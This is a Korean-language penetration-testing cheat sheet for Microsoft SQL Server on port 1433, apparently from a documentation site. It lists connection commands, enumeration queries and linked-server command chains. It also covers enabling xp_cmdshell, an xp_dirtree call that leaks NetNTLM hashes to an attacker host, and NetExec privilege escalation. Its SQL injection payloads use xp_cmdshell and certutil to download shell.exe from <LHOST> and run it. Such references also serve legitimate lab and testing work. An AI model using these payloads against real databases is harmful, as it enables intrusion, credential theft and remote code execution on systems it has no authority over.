---
sidebar_position: 7
---

# MSSQL - 1433

## 기본 정보

**포트**: 1433

Microsoft SQL Server는 Microsoft의 관계형 데이터베이스 관리 시스템입니다.

## 연결

```bash
# sqlcmd
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'

# impacket-mssqlclient
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

## 기본 명령어

```sql
-- 버전 확인
SELECT @@version;

-- 데이터베이스 목록
SELECT name FROM sys.databases;
SELECT name FROM master.sys.databases;

-- 테이블 목록
SELECT * FROM <DATABASE>.information_schema.tables;

-- 테이블 내용 조회
SELECT * FROM <DATABASE>.dbo.users;
```

### 데이터베이스 내용 표시

```sql
1> SELECT name FROM master.sys.databases
2> go
```

## OPENQUERY

```sql
-- 데이터베이스 조회
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go

-- 객체 조회
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

## 바이너리 추출 (Base64)

```sql
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

## NetNTLM Hash 탈취 / Relay 공격

```sql
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

## Linked SQL Server 열거

```sql
-- 현재 사용자
SQL> SELECT user_name();

-- Sysadmin 확인
SQL> SELECT name,sysadmin FROM syslogins;

-- 서버 목록
SQL> SELECT srvname,isremote FROM sysservers;

-- Linked Server에서 명령 실행
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

## xp_cmdshell

### xp_cmdshell 활성화 및 사용

```sql
-- 방법 1
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXEC xp_cmdshell 'dir';

-- 방법 2
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure;
SQL> xp_cmdshell "whoami";

-- 방법 3 (impacket-mssqlclient)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### SQL Injection을 통한 xp_cmdshell

```sql
-- Ping
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--

-- 파일 다운로드
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--

-- 실행
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

## OPENROWSET로 파일 읽기/쓰기

```sql
-- 파일 읽기
SELECT * FROM OPENROWSET(BULK 'C:\PATH\TO\FILE\<FILE>', SINGLE_CLOB) AS x;
```

## NetExec

### RID 브루트포스

```bash
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
```

### 권한 상승

```bash
# 권한 확인
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv

# 권한 상승
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc

# 롤백
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback
```

### 명령 실행

```bash
# OS 명령 실행
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami

# SQL 쿼리 실행
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

### 파일 처리

```bash
# 파일 다운로드
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>

# 파일 업로드
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

## Nmap

```bash
# MSSQL 버전 확인
sudo nmap -p1433 -sV <RHOST>

# MSSQL 정보 수집
sudo nmap -p1433 --script ms-sql-info <RHOST>

# MSSQL 빈 비밀번호 확인
sudo nmap -p1433 --script ms-sql-empty-password <RHOST>

# MSSQL xp_cmdshell 확인
sudo nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USERNAME>,mssql.password=<PASSWORD> <RHOST>
```

## 참고

- xp_cmdshell 활성화 가능 여부 확인
- Linked Server를 통한 명령 실행 체인
- NetNTLM Relay 공격 가능
- SQL Injection 시 xp_cmdshell로 RCE
- sysadmin 권한 확인
